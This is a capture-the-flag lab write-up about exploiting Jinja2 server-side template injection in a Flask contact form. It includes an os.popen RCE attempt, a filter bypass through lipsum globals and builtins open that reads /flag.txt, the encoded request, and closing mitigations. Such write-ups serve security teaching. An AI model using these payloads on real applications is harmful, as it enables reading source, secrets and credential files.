---
title: "Server-Side Template Injection Leads to Arbitrary File Read | HammerHopper"
date: 2026-07-02 14:30:00 +0530
categories: [A05 - Injection, Server-Side Template Injection]
tags: [ssti, jinja2, flask, arbitrary-file-read, template-injection, webverse, webverse-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/hammerhopper-ssti.webp
  alt: "HammerHopper Server-Side Template Injection"
---

## Lab Link

[HammerHopper](https://dashboard.webverselabs-pro.com/mystery-challenges/dillydent)

---

## Overview

**HammerHopper** was a WebVerse Pro lab focused on a vulnerable construction company contact form. The application accepted user-supplied input through the `/contact` endpoint and reflected the submitted name inside a thank-you page.

During testing, the `name` parameter was not treated as plain text. Instead, it was evaluated by the server-side template engine. This allowed **Jinja2 Server-Side Template Injection**. Basic expressions such as `{{7*7}}` were evaluated successfully, confirming template execution.

Direct command execution using common Flask/Jinja payloads was blocked or rendered back as literal text. However, the template context still exposed useful objects. By accessing Jinja globals through the `lipsum` helper and using Python built-ins, it was possible to read `/flag.txt` directly without relying on shell execution.

---

## Objective

The objective was to identify the vulnerability in the contact form, escalate the template injection primitive, and retrieve the flag from the server.

---

## Vulnerability Identification

The contact form submitted data to the following endpoint:

```http
POST /contact HTTP/1.1
Host: redacted
Content-Type: application/x-www-form-urlencoded
```

The initial SSTI test was placed in the `name` parameter:

```http
name={{7*7}}&email=kelvin@kel.com&phone=1111&message=test
```

The server responded with the evaluated result:

```html
<h1 class="thanks-h">Thank you 49, we'll get back to you!</h1>
```

This confirmed that the application was evaluating user-controlled input as a Jinja template.

A second test confirmed Flask/Jinja context access:

```jinja
{{config.DEBUG}}
```

The response showed:

```text
False
```

Another test showed the request object was available:

```jinja
{{request}}
```

The response contained a Flask request object:

```text
<Request 'http://redacted/contact' [POST]>
```

---

## Recon and Filter Behavior

Common Jinja2 RCE payloads were tested first:

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

Instead of executing, the payload was reflected back literally:

```html
Thank you {{ cycler.__init__.__globals__.os.popen('id').read() }}, we'll get back to you!
```

This indicated that the application likely had filtering or blocking logic for dangerous template patterns such as:

```text
__globals__
__builtins__
os
popen
attr
cycler
```

The SSTI itself was still valid, but direct shell execution was blocked.

---

## Exploitation

Since `os.popen()` was blocked, the exploit path shifted from command execution to **arbitrary file read** using Python built-ins.

The useful Jinja object was `lipsum`, which exposes access to its global namespace. Dangerous strings were moved into query-string parameters so they did not appear directly inside the `name` value.

The final payload used this template expression:

```jinja
{{lipsum[request.args.g][request.args.b][request.args.o](request.args.path)[request.args.r]()}}
```

The query string supplied the dangerous attribute names indirectly:

```http
/contact?g=__globals__&b=__builtins__&o=open&path=/flag.txt&r=read
```

The complete request body was:

```http
name=%7B%7Blipsum%5Brequest.args.g%5D%5Brequest.args.b%5D%5Brequest.args.o%5D%28request.args.path%29%5Brequest.args.r%5D%28%29%7D%7D&email=kelvin%40kel.com&phone=1111&message=test
```

Decoded, the payload effectively became:

```jinja
{{ lipsum['__globals__']['__builtins__']['open']('/flag.txt')['read']() }}
```

This allowed the template engine to open and read `/flag.txt` directly.

---

## Proof of Exploitation

The final request successfully read the flag file from the server.

```text
WEBVERSE{REDACTED}
```

---

## Root Cause

The root cause was unsafe server-side rendering of user-controlled input. The submitted `name` value was passed into a Jinja template evaluation path instead of being treated as plain text.

The application attempted to block obvious payloads, but the blacklist approach was incomplete. Attackers could still access sensitive objects indirectly through existing template context variables and query-string controlled keys.

---

## Impact

The vulnerability allowed an attacker to execute arbitrary Jinja expressions on the server.

In this lab, direct shell execution through `os.popen()` was blocked, but the attacker could still use Python built-ins to read arbitrary local files. This led to disclosure of the flag from `/flag.txt`.

In a real-world application, this could expose:

- Application source code
- Configuration files
- Environment variables
- Credentials and API keys
- Local files readable by the web server user

Depending on the available objects and runtime restrictions, SSTI can also lead to full remote code execution.

---

## Mitigation

To prevent this vulnerability:

1. Never render user input as a server-side template.
2. Treat user-controlled values as data, not template source.
3. Pass user input into templates only as escaped variables.
4. Avoid `render_template_string()` with untrusted input.
5. Do not rely on blacklists for SSTI prevention.
6. Use strict sandboxing where template evaluation is unavoidable.
7. Apply allowlist validation for fields such as names, emails, and phone numbers.
8. Run the application with least-privilege filesystem access.

A safe rendering pattern should look like this:

```python
return render_template("thanks.html", name=user_name)
```

The template should then display the variable normally:

```jinja
Thank you {{ name }}
```

The application should not build a new template string from the submitted name.

---

## Lessons Learned

This lab demonstrated that SSTI does not always require direct command execution to be dangerous. Even when common RCE gadgets are blocked, exposed template globals can still provide powerful primitives.

The key lesson is that blacklisting payload strings is not a reliable defense. The correct fix is to remove the unsafe template evaluation pattern entirely and ensure user input is rendered only as escaped data.

